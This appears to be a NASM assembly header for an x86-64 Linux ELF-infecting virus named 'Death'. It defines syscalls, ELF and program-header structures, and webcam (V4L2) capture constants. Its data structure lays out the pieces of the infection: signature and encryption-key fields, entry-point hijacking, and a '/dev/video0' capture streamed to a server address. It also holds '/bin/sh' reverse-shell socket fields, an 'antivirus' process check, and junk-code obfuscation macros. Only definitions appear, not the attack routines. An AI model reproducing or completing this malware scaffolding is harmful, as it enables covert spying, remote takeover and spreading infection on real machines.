%define SYS_read		0
%define SYS_write		1
%define SYS_open		2
%define SYS_close		3
%define SYS_pread64		17
%define SYS_pwrite64	18
%define SYS_getdents64	217
%define SYS_exit		60
%define SYS_fork        57
%define SYS_fstat       5
%define SYS_mmap        9
%define SYS_munmap      11
%define SYS_msync       10
%define SYS_ftruncate    77
%define SYS_ioctl    16
%define SYS_gettimeofday 96
%define SYS_ptrace   101
%define SYS_getrandom 318
%define SYS_time     201

%define MS_SYNC        4
%define DT_DIR       4


;
%define N_BLOCKS       9
; mmap define
%define PROT_READ      1
%define PROT_WRITE     2
%define PROT_EXEC      4
%define MAP_PRIVATE    2
%define MAP_ANONYMOUS 32
%define MAP_FIXED     16
%define MAP_SHARED     1


%define VIDIOC_QUERYBUF     0xc0585609
%define VIDIOC_QBUF         0xc058560f
%define VIDIOC_DQBUF        0xc0585611
%define VIDIOC_REQBUFS      0xc0145608
%define VIDIOC_STREAMON     0x40045612
%define VIDIOC_STREAMOFF    0x40045613

%define V4L2_BUF_TYPE_VIDEO_CAPTURE 1
%define V4L2_MEMORY_MMAP    1

%define NBUF 4      ; NOMBRE DE TAMPONS
%define FRAMES 120   ; FRAMES CAMEREA, 30frames = 1s


%define PROT_READ   1
%define PROT_WRITE  2
%define MAP_SHARED  1

%define O_RDONLY		0
%define SYS_setsid      112
%define SYS_openat		257
%define AT_FDCWD  -100
%define PT_NULL         0
%define PT_LOAD         1
%define PT_NOTE         4
%define PT_SHLIB        5
%define PF_X            1
%define PF_W            2
%define PF_R            4
%define PAGE_SIZE       0x1000
%define AF_INET 2
%define SOCK_STREAM 1
%define SYS_socket 41
%define SYS_connect 42
%define SYS_dup2	33
%define SYS_execve	59

%define Death_SIZE end_addr - _start
%define Death_SIZE_NO_BSS buffer_bss - _start

; STRUCTURES
; https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779






struc mydata
    .file_size           resq 1
    .file                resb 13  ; 'elf64 found!' + '\0'

    .signature           resb 88  ; longueur à adapter à ta chaîne
    .encryption_key      resq 1

    .old_entry           resq 1
    .new_entry           resq 1
    .self                resb 15  ; '/proc/self/exe' + '\0'
    .last                resb 3   ; '..' + '\0'
    .curr                resb 2   ; '.' + '\0'
    .cap_type            resd 1
    .pathv               resb 12  ; '/dev/video0' + '\0'
    .one                 resb 1
    .zero                resb 1
    .paddi               resq 1
    .entry               resq 1
    .exec                resd 1
    .urandom_path        resb 13  ; '/dev/urandom' + '\0'
    .randbuf             resq 1

    .proc_prefix         resb 7   ; '/proc/' + '\0'
    .comm_path           resb 6   ; '/comm' + '\0'
    .forbidden_process   resb 10  ; 'antivirus' + '\0'

    .serv_addr_video:
    .serv_addr_video_af  resw 1
    .serv_addr_video_port resw 1
    .serv_addr_video_ip  resd 1
    .serv_addr_video_pad resb 8

    .serv_addr:
    .serv_addr_af        resw 1
    .serv_addr_port      resw 1
    .serv_addr_ip        resd 1
    .serv_addr_pad       resb 8

    .shell               resb 8   ; '/bin/sh' + '\0'
    .arg0                resb 3   ; 'sh' + '\0'
    .argv                resq 2

    .templates_rdi       resb 28
    .templates_rax       resb 28
    .templates_rsi       resb 28
    .templates_rdx       resb 28
    .templates_rcx       resb 28
    .templates_r10       resb 28
    .templates_r11       resb 28
    .templates_r13       resb 28
    .templates_r15       resb 28
    .templates_sys       resb 117


    .dynm                resb 1
    .inte                resb 1
    .ispie               resb 1

    .new_programheader:
    .p_type              resd 1
    .p_flags             resd 1
    .p_offset            resq 1
    .p_vaddr             resq 1
    .p_paddr             resq 1
    .p_filez             resq 1
    .p_memsz             resq 1
    .p_palign            resq 1

    .newl                resb 1   ; 0xa
    .path                resb 11  ; '/tmp/test/' + '\0'

    ; buffer_bss
    .padd                resb 4096
    .buff                resb 4096
    .stack               resb 144 ;
    .elfp0               resb 56
    .elfp1               resb 56

    .buf_addrs           resq NBUF
    .buf_sizes           resq NBUF
    .reqb                resb 16
    .v4buf               resb 88

    .path_buffer         resb 256
    .comm_buff           resb 32
    .temp_buf            resb 8
    .time_buf            resb 8
    .timeval             resb 16
endstruc



struc dirent
.d_ino resb 8
.d_off resb 8
.d_reclen resb 2
.d_type resb 1
.d_name resb 8
endstruc


struc ehdr
.e_ident        resb 16       ;    /* File identification. */
.e_type         resb 2        ;    /* File type. */
.e_machine      resb 2        ;    /* Machine architecture. */
.e_version      resb 4        ;    /* ELF format version. */
.e_entry        resb 8        ;    /* Entry point. */
.e_phoff        resb 8        ;    /* Program header file offset. */
.e_shoff        resb 8        ;    /* Section header file offset. */
.e_flags        resb 4        ;    /* Architecture-specific flags. */
.e_ehsize       resb 2        ;    /* Size of ELF header in bytes. */
.e_phentsize    resb 2        ;    /* Size of program header entry. */
.e_phnum        resb 2        ;    /* Number of program header entries. */
.e_shentsize    resb 2        ;    /* Size of section header entry. */
.e_shnum        resb 2        ;    /* Number of section header entries. */
.e_shstrndx     resb 2        ;    /* Section name strings section. */
endstruc

struc phdr
.p_type         resb 4        ;    /* Entry type. */
.p_flags        resb 4        ;    /* Access permission flags. */
.p_offset       resb 8        ;    /* File offset of contents. */
.p_vaddr        resb 8        ;    /* Virtual address in memory image. */
.p_paddr        resb 8        ;    /* Physical address (not used). */
.p_filesz       resb 8        ;    /* Size of contents in file. */
.p_memsz        resb 8        ;    /* Size of contents in memory. */
.p_align        resb 8        ;    /* Alignment in memory and file. */
endstruc

; MACROS

%macro JUNK_5 0
    db 0x50, 0x6A, 0x18, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
%endmacro




%macro PUSH_ALL 0
    pushfq
    push	rax
    push	rbx
    push	rcx
    push	rdx
    push	rsi
    push	rdi
    push	rbp
    push	r8
    push	r9
    push	r10
    push	r11
    push	r12
    push	r13
    push	r14
    push	r15
%endmacro

%macro POP_ALL 0
    pop		r15
    pop		r14
    pop		r13
    pop		r12
    pop		r11
    pop		r10
    pop		r9
    pop		r8
    pop		rbp
    pop		rdi
    pop		rsi
    pop		rdx
    pop		rcx
    pop		rbx
    pop		rax
    popfq
%endmacro



%macro PUSH_ALLr 0
    push	rbx
    push	rcx
    push	rdx
    push	rsi
    push	rdi
    push	rbp
    push	r8
    push	r9
    push	r10
    push	r11
    push	r12
    push	r13
    push	r14
    push	r15
%endmacro

%macro POP_ALLr 0
    pop		r15
    pop		r14
    pop		r13
    pop		r12
    pop		r11
    pop		r10
    pop		r9
    pop		r8
    pop		rbp
    pop		rdi
    pop		rsi
    pop		rdx
    pop		rcx
    pop		rbx
%endmacro
